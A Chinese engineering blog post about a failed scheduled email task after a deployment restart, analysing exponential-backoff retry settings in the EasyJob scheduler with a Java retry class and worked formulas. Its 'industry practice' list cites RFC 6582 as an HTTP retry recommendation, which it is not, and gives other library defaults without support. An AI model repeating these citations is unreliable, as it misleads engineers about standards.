pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：齐海智</p>
<p>在 618 大促的技术战场上，每一行代码、每一个配置都影响着一线的实实在在的业务。一次看似平常的发版，却意外暴露了我们系统中的定时任务管理短板，这促使我们深入剖析分布式任务调度中异常重试机制的技术细节，并最终将其转化为守护系统稳定性的坚固防线。​</p>
<h2 data-id="heading-0">一、异常事件回溯：隐藏在发版背后的定时炸弹​</h2>
<p>发版次日，业务部门反馈商家未收到门店收货明细邮件，导致门店收货业务收到影响。技术团队迅速启动应急流程，通过全链路日志追踪和系统状态分析，发现了问题的根源是：发版过程中，由于服务重启，中断了定时任务进程，正在执行的邮件发送任务被意外终止。而该任务在管理平台上并未配置任何重试策略，业务代码上也没有进行相关的检测和重试，这就导致任务失败后无法自动恢复执行，也未被及时感知到，进而引发业务阻断。​</p>
<p>为解决燃眉之急，研发人员立即登录任务管理平台，手工触发邮件发送任务，确保业务及时恢复。但这次事件给我们敲响了警钟：在分布式任务调度场景下，面对网络抖动、进程异常终止等场景，异常重试机制是保障业务可靠性的关键。​</p>
<h2 data-id="heading-1">二、重试策略设计：从理论到代码的深度解析​</h2>
<h3 data-id="heading-2">2.1 验证EasyJob的重试策略</h3>
<p>在复盘问题的过程中，我们发现了EasyJob分布式任务是具有重试策略的，只是默认不开启，而不是默认开启。</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b574a7bec64c4de3a9b0d7cb3086ef00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=1nSIBB6reHYE1i43vUcBcyL69qU%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>该策略以三个核心参数为基础：首次重试间隔时间 F、重试间隔乘数 M 和最大重试次数 C。</p>
<p>通过这三个参数的组合，我们可以灵活控制任务重试节奏，平衡系统负载与任务恢复效率。​</p>
<p>例如：配置t=10s, M=2, C=10，则间隔时间依次是：</p>



































<table><thead><tr><th>重试次数 nn</th><th>间隔时间计算方式</th><th>间隔时间结果</th></tr></thead><tbody><tr><td>1</td><td>10s（初始间隔，无计算）</td><td>10s</td></tr><tr><td>2</td><td>10s×2</td><td>20s</td></tr><tr><td>3</td><td>20s×2</td><td>40s</td></tr><tr><td>4</td><td>40s×2</td><td>80s</td></tr><tr><td>5</td><td>80s×2</td><td>160s</td></tr></tbody></table>
<p>验证日志：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-number">21</span>:<span class="hljs-number">45</span>:<span class="hljs-number">29.990</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-1</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - 开始执行发送邮件任务
<span class="hljs-number">21</span>:<span class="hljs-number">45</span>:<span class="hljs-number">40.204</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-2</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - 开始执行发送邮件任务
<span class="hljs-number">21</span>:<span class="hljs-number">46</span>:<span class="hljs-number">00.674</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-3</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - 开始执行发送邮件任务
<span class="hljs-number">21</span>:<span class="hljs-number">46</span>:<span class="hljs-number">41.749</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-4</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - 开始执行发送邮件任务
<span class="hljs-number">21</span>:<span class="hljs-number">48</span>:<span class="hljs-number">02.398</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-5</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - 开始执行发送邮件任务
<span class="hljs-number">21</span>:<span class="hljs-number">50</span>:<span class="hljs-number">43.008</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-1</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - 开始执行发送邮件任务
</code></pre>








































<table><thead><tr><th>任务序号</th><th>开始时间</th><th>与前一任务的间隔</th></tr></thead><tbody><tr><td>第 1 个任务</td><td>21:45:29.990</td><td>-</td></tr><tr><td>第 2 个任务</td><td>21:45:40.204</td><td>10.214 秒</td></tr><tr><td>第 3 个任务</td><td>21:46:00.674</td><td>20.47 秒</td></tr><tr><td>第 4 个任务</td><td>21:46:41.749</td><td>41.075 秒</td></tr><tr><td>第 5 个任务</td><td>21:48:02.398</td><td>80.649 秒（约 1 分 20.65 秒）</td></tr><tr><td>第 6 个任务</td><td>21:50:43.008</td><td>160.61 秒（约 2 分 40.61 秒）</td></tr></tbody></table>
<p>与上面计算的一致。</p>
<p>验证方案：</p>
<p>1、实现接口：com.wangyin.schedule.client.job.ScheduleFlowTask，并设置任务返回失败：</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e96b7e58f46c490594b3455d9aa213e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=oSbGfpss1qjiKqq5wq60SCNn2tQ%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>2、创建CRON触发器</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d8fbfe2f5f34d3492c6e5187697e58b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=8uuZbq8uSbqLfaRnu1Mb3YeeIQA%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>3、设置自动重试参数</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2042632a7a574b8dbdf7265b8bc29b8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=o9JLDrqub9JJaiJNk59jFN7%2BW%2B8%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5ea810191ea4be9b86c6233b2c26571~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=db5iJIkULRetibDvYW4CVs3pa%2Fc%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>4、暂停任务并手工触发一次</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7e740fd7b484070aedc2a64098a9622~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=kQMZXr95jJSw%2B1qADFIq7PzBDuE%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<h3 data-id="heading-3">2.2 实现一个简单的重试策略</h3>
<p>根据上述策略，简单实现了一个灵活可配置的任务重试机制。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskRetryExecutor</span> {
    <span class="hljs-meta">@Getter</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> newScheduledThreadPool(<span class="hljs-number">10</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> firstRetryInterval;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> intervalMultiplier;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> maxRetryCount;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TaskRetryExecutor</span><span class="hljs-params">(<span class="hljs-type">long</span> firstRetryInterval, <span class="hljs-type">int</span> intervalMultiplier, <span class="hljs-type">int</span> maxRetryCount)</span> {
        <span class="hljs-built_in">this</span>.firstRetryInterval = firstRetryInterval;
        <span class="hljs-built_in">this</span>.intervalMultiplier = intervalMultiplier;
        <span class="hljs-built_in">this</span>.maxRetryCount = maxRetryCount;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">submitRetryableTask</span><span class="hljs-params">(Runnable task)</span> {
        executeWithRetry(task, <span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeWithRetry</span><span class="hljs-params">(Runnable task, <span class="hljs-type">int</span> currentRetryCount)</span> {
        executor.schedule(() -&gt; {
            <span class="hljs-keyword">try</span> {
                task.run();
                log.info(<span class="hljs-string">"任务在第{}次尝试时成功执行"</span>, currentRetryCount);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                log.error(<span class="hljs-string">"任务在第{}次尝试时执行失败"</span>, currentRetryCount, e);
                <span class="hljs-keyword">if</span> (currentRetryCount &lt;= maxRetryCount) {
                    <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> calculateRetryDelay(currentRetryCount);
                    log.info(<span class="hljs-string">"计划在{}毫秒后进行第{}次重试"</span>, delay, currentRetryCount);
                    executeWithRetry(task, currentRetryCount + <span class="hljs-number">1</span>);
                } <span class="hljs-keyword">else</span> {
                    log.error(<span class="hljs-string">"超过最大重试次数。任务执行最终失败。"</span>);
                }
            }
        }, currentRetryCount == <span class="hljs-number">1</span> ? <span class="hljs-number">0</span> : calculateRetryDelay(currentRetryCount), TimeUnit.MILLISECONDS);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">calculateRetryDelay</span><span class="hljs-params">(<span class="hljs-type">int</span> retryCount)</span> {
        <span class="hljs-keyword">if</span> (retryCount == <span class="hljs-number">1</span>) {
            <span class="hljs-keyword">return</span> firstRetryInterval;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retryCount &gt; <span class="hljs-number">1</span> &amp;&amp; retryCount &lt;= maxRetryCount) {
            <span class="hljs-type">long</span> <span class="hljs-variable">previousDelay</span> <span class="hljs-operator">=</span> calculateRetryDelay(retryCount - <span class="hljs-number">1</span>);
            <span class="hljs-keyword">return</span> previousDelay * intervalMultiplier;
        }
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>; <span class="hljs-comment">// 超出最大重试次数，返回错误标识</span>
    }
}
</code></pre>
<p>​在上述代码中：</p>
<p>1.TaskRetryExecutor类封装了任务重试的核心逻辑。构造函数接收三个关键参数：firstRetryInterval、intervalMultiplier和maxRetryCount，用于配置重试策略，对应于EasyJob的F、M、C参数。</p>
<p>2.submitRetryableTask方法接收一个可执行任务，并启动重试流程。它调用executeWithRetry方法，初始重试次数为1。</p>
<p>3.executeWithRetry方法是重试逻辑的核心。它使用ScheduledExecutorService来调度任务执行：</p>
<p>◦如果任务执行成功，记录成功日志。</p>
<p>◦•如果任务执行失败且未超过最大重试次数，计算下一次重试的延迟时间，并递归调用自身进行重试。</p>
<p>◦•如果超过最大重试次数，记录最终失败日志。</p>
<p>4.calculateRetryDelay方法实现了重试间隔的计算规则：</p>
<p>◦第一次重试使用firstRetryInterval。</p>
<p>◦之后的重试间隔是前一次间隔乘以intervalMultiplier。</p>
<p>◦如果超出最大重试次数，返回-1表示错误。</p>
<p>通过这种设计，我们实现了一个可复用、可配置的任务重试机制。它能够根据配置的参数自动调整重试间隔，在任务失败时进行有策略的重试，同时避免无限重试导致的资源浪费。</p>
<p>详细代码可在以下Git仓库中找到：<a href="https://link.juejin.cn?target=mailto%3Agit%40coding.jd.com" target="_blank" title="mailto:git@coding.jd.com" ref="nofollow noopener noreferrer">git@coding.jd.com</a>:newJavaEngineerOrientation/TaskRetryStrategies.git</p>
<h3 data-id="heading-4">2.3 重试策略的理论分析</h3>
<h4 data-id="heading-5">2.3.1 EasyJob对乘数和最大重试次数的限制</h4>
<p>在对EasyJob也进行了重试的验证中发现：</p>
<p>1.<strong>每次重做的乘数</strong>取值范围是[1,8]，可以是具有一位小数位的浮点数，比如3.5，</p>
<p>2.<strong>最多重做次数</strong>是[1,16]间的整数，第一次重试的间隔没有限制，单位是秒。</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61f6fbdd96984b6dbec76143900f644f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=ne%2F5PGM%2FeWDW0rEDk4wSRsVd9Sc%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<h4 data-id="heading-6">2.3.2 梯度分析</h4>
<p>通过上面的验证和重试相关概念的定义，可以得到：第n次重试的间隔时间=第一次间隔时间*乘数^(n-1)，即：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9d5ae3fcf7f424fa69c7982658b5482~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=VADFj4RfwUNoSMlLSyRQpFNwS4Y%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>其中：</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48604f149d244dd0884133d0bf0ddaaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=zU%2B7NJbkMcDkhHSfNLRPoR6aYwI%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>对乘数M的梯度：</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5bf02650ad94b84a3dd2c06dbd9e1b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=JVam21aBAyxH2UqkxfvnMyzSByc%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>对重试次数n的梯度：</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/220c8e6e16f741b4b6fae21c79d12ad1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=39uDi9yB6E2FPxHQgeWdmmKncpc%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>详细推导： <a href="https://link.juejin.cn?target=http%3A%2F%2Fxingyun.jd.com%2FcodingRoot%2FnewJavaEngineerOrientation%2FTaskRetryStrategies%2Fblob%2Fmaster%2Fsrc%2Fmain%2Fresources%2F%25E5%2585%25AC%25E5%25BC%258F%25E6%258E%25A8%25E5%25AF%25BC.md" target="_blank" title="http://xingyun.jd.com/codingRoot/newJavaEngineerOrientation/TaskRetryStrategies/blob/master/src/main/resources/%E5%85%AC%E5%BC%8F%E6%8E%A8%E5%AF%BC.md" ref="nofollow noopener noreferrer">xingyun.jd.com/codingRoot/…</a></p>
<p>从下图可以看出，重试次数n较大时（比如8），乘数 M 的细微变化都会导致，任务的间隔时间发生剧烈变化，因此n超过8之后，M基本不可调。</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30ce07a86d3c489b8f653e803454e0d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=tl1UKWeCe5yzmc%2FzasYVAw6YYLw%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>同样的，从下图可以看到，乘数M较大时（比如4），n的细微变化也会导致任务的间隔时间爆发式的增加。</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f89314343f374ead9a0c5df8bc591eac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=dE0pqW8mBrLkN3k6igjK1wHbynk%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<h5 data-id="heading-7">1、乘数在1.5-4 的合理性</h5>
<p>过小乘数 (&lt;1.5) 的问题：</p>
<p>当乘数 = 1.2，重试 10 次的间隔时间是：1次:1, 2次:1.2, 3次:1.44, ..., 10次:5.16，</p>
<p>10 次重试总间隔仅 5 倍，接近固定间隔，可能导致 "惊群效应"（大量请求同时重试）。</p>
<p>过大乘数 (&gt;4) 的问题</p>
<p>当乘数 = 8，重试 5 次的间隔时间：1次:1, 2次:8, 3次:64, 4次:512, 5次:4096</p>
<p>5 次重试后间隔已超 1 小时（假设初始间隔时间是最小的1s，4096s&gt;1小时），可能导致请求长时间等待，用户体验差。</p>
<p>因此，乘数 = 1.5-4 在 "退避效率" 和 "资源消耗" 间取得平衡，一般取乘数= 2 （标准指数退避）。</p>
<p>行业实践：AWS SDK 默认乘数 = 2，Google gRPC 重试策略推荐乘数 = 1.5-3，多数 HTTP 客户端库 (如 requests) 默认乘数 = 2。</p>
<h5 data-id="heading-8">2、最大重试次数3-10的合理性</h5>
<p>假设单次重试成功概率为P（比如网络/服务临时故障，重试成功概率通常较高），重试 n次至少成功 1 次的概率为：</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c458cc86847344c392999105849c5040~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=Ycx2K4flJCbvb%2B%2FD5K%2FdlcvGFLI%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>当 p=0.5，（单次重试 50% 成功概率）：</p>
<p>n=3 时，成功概率 =1−(0.5)^3=87.5%</p>
<p>n=5 时，成功概率 =1−(0.5)^5=96.875%</p>
<p>n=10 时，成功概率 =1−(0.5)^10≈99.9%</p>
<p>实际场景中，<strong>临时故障的单次成功概率远高于 50%</strong> （比如网络抖动重试成功概率可能达 80%）</p>
<p>若 p=0.8，n=3时成功概率已达 1−0.2^3=99.2%几乎覆盖所有临时故障。</p>
<p>因此，3 - 10 次重试，能以极高概率（99%+）覆盖“临时故障”场景，再增加次数对成功概率提升极有限（边际效应递减）。</p>
<p>因为已知的任务延迟时间的公式是：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6d1fded5dae4c4499a5aaff2295421d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=%2FUJ4ZAOmysCsjXL96s46Hw7fm5I%3D" alt="" loading="lazy"/></p>
<p>﻿，</p>
<p>n从1到C进行累加得到总耗时:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47c9dc3f6027427e91fbb4720af1f6f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=TR3ZBRaHU199Q%2BUa5YjDvjx2WIE%3D" alt="" loading="lazy"/></p>
<p>﻿，</p>
<p>根据等比数列求和公式可以得到：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbb66ae44f8446d0ba5dcb6ae971c6b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=jMhrkwWNg5QHF%2BjyqmRLGqdkD6U%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>令 M=2（常用乘数），F=1 秒（最小可能值）：</p>
<p>n=3时，T=（2^3-1）/（2-1）=7秒</p>
<p>n=5时，T=(2^5-1)/(2-1)=31秒</p>
<p>n=10时，T=2^10-1=1023秒≈17分钟</p>
<p>n=13时，T=2^13-1≈2.3小时</p>
<p>n=15时，T=2^15-1≈9.1小时</p>
<p>当n超过10后，每次增加都会导致总耗时急剧增长，很容易超过业务的容忍上限（具体业务具体分析），也可能因为重试过多，导致被调用的系统压力增加，甚至造成系统崩溃。</p>
<p>故：3 - 10 次重试可将总耗时控制在“业务可接受范围”（几秒到十几分钟），同时避免资源过载。</p>
<p>行业实践：Kafka 消费者重试：默认 10 次、Redis 客户端重试：默认 5 次、Hadoop 任务重试：默认 3-5 次、RFC 建议：RFC 6582（HTTP 重试）建议：3-5 次重试。</p>
<h5 data-id="heading-9">3、最佳实践速查表</h5>









































<table><thead><tr><th>参数</th><th>短期任务(分钟级)</th><th>中期任务(小时级)</th><th>长期任务(天级)</th></tr></thead><tbody><tr><td>乘数</td><td>2</td><td>2</td><td>1.75</td></tr><tr><td>重试次数</td><td>3 - 5</td><td>5 - 8</td><td>8 - 12</td></tr><tr><td>初始间隔(秒)</td><td>1 - 5</td><td>30 - 60</td><td>300 - 600</td></tr><tr><td>总耗时范围</td><td>&lt;60秒</td><td>5 - 10分钟</td><td>1 - 2小时</td></tr><tr><td>适用场景</td><td>临时网络波动 服务重启、发版</td><td>服务短暂过载</td><td>资源密集型操作</td></tr></tbody></table>
<h2 data-id="heading-10">三、经验沉淀：异常重试机制的设计原则​</h2>
<p>通过这次实践和对行业方案的研究，我们总结出异常重试机制设计的四大核心原则：​</p>
<p>1.动态适应性原则：重试策略应支持参数化配置，根据业务场景和系统负载动态调整重试间隔和次数，避免 “一刀切” 的重试策略对系统造成冲击。​</p>
<p>2.幂等性保障原则：确保任务在多次重试过程中不会产生重复数据或副作用，通过唯一标识、状态机等技术手段，实现任务的幂等执行。​</p>
<p>3.故障隔离原则：将重试逻辑与业务逻辑分离，通过消息队列、异步调度等方式，降低重试操作对主线程的影响，避免因重试失败导致系统整体崩溃。​</p>
<p>4.可观测性原则：建立完善的监控和告警体系，实时追踪任务重试状态，在达到最大重试次数时及时发出告警，便于运维人员快速定位和解决问题。​</p>
<h2 data-id="heading-11">四、结语：以技术沉淀筑牢大促防线​</h2>
<p>这次线上异常事件，犹如一面镜子，让我们清晰地看到了系统中的潜在风险，也为我们提供了一次宝贵的技术提升机会。通过对异常重试机制的深入研究和实践，我们不仅解决了当前问题，更将这些经验转化为团队的技术资产。在未来的 618 大促及其他关键业务场景中，我们将以更完善的技术方案、更严谨的设计原则，守护系统的稳定运行，为业务发展提供坚实的技术保障。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于知识工程&JoyAgent双RAG的智能代码评审系统的探索与实践]]></title>    <link>https://juejin.cn/post/7597379486428364826</link>    <guid>https://juejin.cn/post/7597379486428364826</guid>    <pubDate>2026-01-21T09:37:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597379486428364826" data-draft-id="7597640029573627955" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于知识工程&amp;JoyAgent双RAG的智能代码评审系统的探索与实践"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2026-01-21T09:37:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="京东云开发者"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于知识工程&amp;JoyAgent双RAG的智能代码评审系统的探索与实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    京东云开发者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:37:02.000Z" title="Wed Jan 21 2026 09:37:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
